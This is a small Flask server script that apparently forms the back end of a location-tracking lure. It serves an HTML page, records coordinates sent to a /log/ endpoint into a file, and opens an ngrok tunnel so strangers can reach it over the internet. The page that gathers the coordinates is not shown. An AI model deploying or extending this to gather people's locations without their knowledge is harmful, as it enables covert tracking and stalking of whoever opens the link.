# -*- coding: utf-8 -*-

from flask import Flask, send_from_directory
from os import system


app = Flask(__name__)


@app.route('/')
def URLa():
    return send_from_directory('.', 'URLa.html')

@app.route('/log/<coordinates>')
def log(coordinates):
    with open('coordinates.log', 'a') as f:
        f.write(coordinates + '\n')
    return '', 200


if __name__ == '__main__':
    system('xterm -e ./ngrok http 80 & clear')
    app.run(port = 80, threaded = True)
